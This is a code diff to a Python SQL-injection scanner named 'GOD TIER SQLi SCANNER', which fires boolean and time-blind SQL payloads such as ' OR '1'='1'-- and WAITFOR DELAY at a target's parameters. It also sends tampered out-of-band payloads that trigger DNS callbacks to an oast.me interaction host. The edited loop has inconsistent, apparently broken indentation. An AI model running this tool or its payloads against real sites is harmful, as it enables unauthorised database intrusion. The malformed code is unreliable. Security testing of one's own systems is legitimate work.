@@ -14,12 +14,13 @@ import base64
 from urllib.parse import urlparse, urljoin, parse_qs, urlencode
 from bs4 import BeautifulSoup
 from typing import List, Dict, Any, Set
-from rich.console import Console
+from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeRemainingColumn
 from rich.table import Table
 from rich.panel import Panel
 from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn
 from rich.live import Live
 from rich.syntax import Syntax
+from rich.console import Console
 import dns.resolver
 import uuid
 import threading
@@ -123,12 +124,15 @@ class GodTierScanner:
         self.graphql_found = False
         self.api_endpoints = []
 
-    async def fetch(self, session, url):
+    def test_oob_dns(self, url: str, param: str):
+        payload = random.choice(list(OOB_PAYLOADS.values()))
+        tampered = ultimate_tamper(payload)[0]
+        test_url = url.replace("FUZZ", tampered)
+        dns_queue.put(f"{session_id}.oast.me")
         try:
-            async with session.get(url, timeout=15) as resp:
-                return await resp.text(), resp.headers
+            requests.get(test_url, timeout=10)
         except:
-            return "", {}
+            pass
 
     def discover_endpoints(self):
         from playwright.sync_api import sync_playwright
@@ -149,7 +153,8 @@ class GodTierScanner:
 
             # GraphQL introspection
             graphql_url = None
-            if page.locator("script").inner_text().find("graphql") != -1:
+            scripts_text = page.eval_on_selector_all("script", "els => els.map(e => e.innerText).join(' ')")
+            if scripts_text.find("graphql") != -1:
                 potential = re.findall(r'["\'](/graphql|/api/graphql|/api)["\']', page.content())
                 if potential:
                     graphql_url = urljoin(self.target, potential[0])
@@ -165,13 +170,6 @@ class GodTierScanner:
         api_paths = ["/api/v1", "/api", "/graphql", "/v1", "/v2", "/rest", "/json"]
         for path in api_paths:
             self.endpoints.add(urljoin(self.target, path))
-
-    def test_oob_dns(self, url: str, param: str):
-        payload = random.choice(list(OOB_PAYLOADS.values()))
-        tampered = ultimate_tamper(payload)[0]
-        test_url = url.replace("FUZZ", tampered)
-        dns_queue.put(f"{session_id}.oast.me")
-        requests.get(test_url, timeout=10)
 
     def scan(self):
         console.print(Panel.fit(f"[bold magenta]GOD TIER SQLi SCANNER v3.0\nTarget: {self.target}\nSession: {session_id}[/]"))
@@ -192,11 +190,22 @@ class GodTierScanner:
 
                 for param in all_params[:5]:
                     if score_parameter(param) > 50:
-                        if self.inject(url, param, "' OR '1'='1'--"):
-                            self.vulns.append({"url": url, "param": param, "type": "Boolean"})
-                        if self.inject(url, param, "'; WAITFOR DELAY '0:0:7'--"):
-                            self.vulns.append({"url": url, "param": param, "type": "Time-Blind"})
-                        self.test_oob_dns(url, param)
+                       if self.inject(url, param, "' OR '1'='1'--"):
+                                           full_vuln_url = f"{url}?{param}=FUZZ" if "?" not in url else f"{url}&{param}=FUZZ"
+                                           self.vulns.append({
+                                               "url": full_vuln_url,
+                                               "param": param,
+                                               "type": "Boolean"
+                                           })
+
+                       if self.inject(url, param, "'; WAITFOR DELAY '0:0:7'--"):
+                                           full_vuln_url = f"{url}?{param}=FUZZ" if "?" not in url else f"{url}&{param}=FUZZ"
+                                           self.vulns.append({
+                                               "url": full_vuln_url,
+                                               "param": param,
+                                               "type": "Time-Blind"
+                                           })
+                       self.test_oob_dns(url, param)
 
                 progress.advance(task2)
 
